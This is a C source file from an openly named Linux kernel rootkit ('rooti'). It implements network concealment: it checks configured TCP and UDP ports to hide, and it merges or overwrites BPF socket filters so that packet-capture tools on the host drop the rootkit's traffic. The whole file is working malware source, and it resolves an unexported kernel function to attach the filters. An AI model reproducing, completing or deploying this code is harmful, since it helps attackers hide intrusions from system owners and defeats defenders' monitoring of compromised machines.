#include <linux/socket.h>
#include <linux/filter.h>
#include "net.h"
#include "../../utils.h"
#include "../../config.h"

static const int ROOTI_MAX_BPF_PROGRAM_LEN = 255;

// Indicates whether the given TCP port should be hidden by the rootkit
bool rooti_should_hide_tcp_port(unsigned short port)
{
    for (int i = 0; i < ROOTI_HIDDEN_TCP_PORTS_COUNT; i++) {
        if (ROOTI_HIDDEN_TCP_PORTS[i] == port) {
            return true;
        }
    }
    return false;
}

// Indicates whether the given UDP port should be hidden by the rootkit
bool rooti_should_hide_udp_port(unsigned short port)
{
    for (int i = 0; i < ROOTI_HIDDEN_UDP_PORTS_COUNT; i++) {
        if (ROOTI_HIDDEN_UDP_PORTS[i] == port) {
            return true;
        }
    }
    return false;
}

/*
    Replace ret instructions with a positive return value (e.g instructions to 'accept' the packet) with a jump instruction
    to the start of the user-defined BPF program (e.g 'program_offset').
*/
static void rooti_replace_ret_instructions(struct sock_fprog_kern *fprog, loff_t program_offset)
{
    loff_t jmp_offset;
    for (int i = 0; i < program_offset; i++) {
        if (BPF_CLASS(fprog->filter[i].code) != BPF_RET || fprog->filter[i].k == 0) {
            continue;
        }
        jmp_offset = program_offset - (i + 1);
        fprog->filter[i].code = BPF_JMP | BPF_JA;
        fprog->filter[i].jt = 0;
        fprog->filter[i].jf = 0;
        fprog->filter[i].k = jmp_offset;
    }
}

/*
    Concatenate two source BPF filter programs into one by ANDing the filters they represent.
    Saves the result into the filter 'dst_fprog' which is heap-allocated and should be freed later.
*/
static int rooti_concat_filter_programs(struct sock_fprog_kern *src_fprog1, struct sock_fprog_kern *src_fprog2,
                                        struct sock_fprog_kern *dst_fprog)
{    
    dst_fprog->len = src_fprog1->len + src_fprog2->len;
    dst_fprog->filter = kcalloc(dst_fprog->len, sizeof(struct sock_filter), GFP_KERNEL);
    if (dst_fprog->filter == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return -ENOMEM;
    }

    memcpy(dst_fprog->filter, src_fprog1->filter, bpf_classic_proglen(src_fprog1));
    memcpy(dst_fprog->filter + src_fprog1->len, src_fprog2->filter, bpf_classic_proglen(src_fprog2));

    // Replace ret instructions of the 'accept path' with a jump to the start of the user program
    rooti_replace_ret_instructions(dst_fprog, src_fprog1->len);
    return 0;
}

/* 
    Copies the userspace BPF filter program pointed to by 'fprog_ptr' into the parallel kernelspace structure.
    The filter of the kernel structure is heap-allocated and should be freed later.
*/
static int rooti_copy_user_fprog(struct sock_fprog_kern *user_fprog_kernel, struct sock_fprog *user_fprog)
{
    size_t user_program_size = bpf_classic_proglen(user_fprog);
    int err;

    user_fprog_kernel->len = user_fprog->len;
    user_fprog_kernel->filter = kmalloc(user_program_size, GFP_KERNEL);
    if (user_fprog_kernel->filter == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return -ENOMEM;
    }

    err = copy_from_user(user_fprog_kernel->filter, user_fprog->filter, user_program_size);
    if (err) {
        ROOTI_DEBUG("copy_from_user() failed: %d", err);
        return -EFAULT;
    }

    return 0;
}

// Attaches a new BPF filter program 'fprog' to the provided socket 'sock'
static int rooti_attach_traffic_filter(struct sock *sock, struct sock_fprog_kern *fprog)
{
    ROOTI_RESOLVE_FUNC_ADDR(__sk_attach_prog, -EINVAL, int, struct bpf_prog *, struct sock *);
    struct bpf_prog *bpf_prog;
    int err;

    err = bpf_prog_create(&bpf_prog, fprog);
    if (bpf_prog == NULL) {
        ROOTI_DEBUG("bpf_prog_create() failed %d", err);
        return err;
    }

    err = ____sk_attach_prog(bpf_prog, sock);
    if (err) {
        bpf_prog_destroy(bpf_prog);
        ROOTI_DEBUG("__sk_attach_prog() failed: %d", err);
        return err;
    }

    return 0;
}

/*
    This function attaches additional cBPF filters (which are specifyed in the rootkit's configuration)
    to the filters specified by the user. It effectively merges the user defined filter program with the rootkit's
    filter program such that both filters must be satisfied in order to accept the packet.
*/
int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog *user_fprog)
{
    struct sock_fprog_kern kernel_fprog = {
        .filter = ROOTI_BPF_FILTER_PROGRAM,
        .len = ROOTI_BPF_FILTER_PROGRAM_COUNT
    };
    struct sock_fprog_kern user_fprog_kernel;
    struct sock_fprog_kern merged_fprog;
    int err;

    if (kernel_fprog.len > ROOTI_MAX_BPF_PROGRAM_LEN) {
        ROOTI_DEBUG("configured BPF filter is longer than the maximum of 255 instructions");
        return -EINVAL;
    }

    err = rooti_copy_user_fprog(&user_fprog_kernel, user_fprog);
    if (err) {
        return err;
    }

    err = rooti_concat_filter_programs(&kernel_fprog, &user_fprog_kernel, &merged_fprog);
    if (err) {
        return err;
    }

    err = rooti_attach_traffic_filter(sock, &merged_fprog);
    
    kfree(user_fprog_kernel.filter);
    kfree(merged_fprog.filter);
    return err;
}

/*
    This function overwrites the BPF filter attached to 'sock' with the rootkit's
    configured BPF filter program.
*/
int rooti_overwrite_traffic_filter(struct sock *sock)
{
    struct sock_fprog_kern fprog = {
        .filter = ROOTI_BPF_FILTER_PROGRAM,
        .len = ROOTI_BPF_FILTER_PROGRAM_COUNT
    };

    if (fprog.len > ROOTI_MAX_BPF_PROGRAM_LEN) {
        ROOTI_DEBUG("configured BPF filter is longer than the maximum of 255 instructions");
        return -EINVAL;
    }

    return rooti_attach_traffic_filter(sock, &fprog);
}